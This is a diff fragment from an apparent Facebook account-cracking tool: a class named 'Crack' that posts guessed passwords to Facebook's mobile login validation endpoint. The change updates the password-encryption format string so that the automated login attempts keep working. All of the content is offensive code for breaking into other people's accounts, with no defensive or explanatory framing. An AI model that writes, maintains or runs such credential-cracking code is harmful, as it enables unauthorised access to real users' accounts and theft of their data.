@@ -172,7 +172,7 @@ class Crack:
 					'uid':user,
 					'next':'https://mbasic.facebook.com/login/save-device/',
 					'flow':'login_no_pin',
-					'encpass':'#PWD_BROWSER:3:{}:{}'.format(real_time(),pw)
+					'encpass':'#PWD_BROWSER:5:{}:{}'.format(real_time(),pw)
 				}
 			)
 			session.post(f'{url}/login/device-based/validate-password/', data=data, headers={
